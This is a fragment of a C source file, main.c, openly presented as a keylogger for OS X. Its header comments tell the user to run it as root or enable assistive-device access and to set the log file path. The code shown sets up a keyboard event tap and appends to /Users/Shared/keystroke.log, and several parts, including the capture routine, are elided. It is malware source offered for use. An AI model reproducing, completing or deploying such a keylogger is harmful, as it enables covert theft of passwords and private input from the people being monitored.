//
//  main.c
//  Nicolas Tsagarides Keylogger for OS X
//
//  Created by Nicolas Tsagarides on 4/2/15.
//
//  used code snippets found at http://osxbook.com/book/bonus/chapter2/alterkeys/
//
//  unfortunatelly, due to the nature of the project, the executable has to be launched as root
//  if it doesn't get launched as root it will only capture the modifier keys
//  for example, prepending the command with sudo
//  another alternative is to enable access for assistive devices but I haven't had much success with that
//  also be sure to change the logfile path at line 41 to a path where you have write access
//  line 65 is kept for debugging, you can comment it out if needed
...
int main (int argc, const char * argv[]) {
    ...
    if (!eventTap) {
        fprintf(stderr, "failed to create event tap\nyou need to enable \"Enable access for assistive devices\" in Universal Access preference panel.");
        exit(1);
    }
    ...
    logFile = fopen("/Users/Shared/keystroke.log", "a");
    CFRunLoopRun();
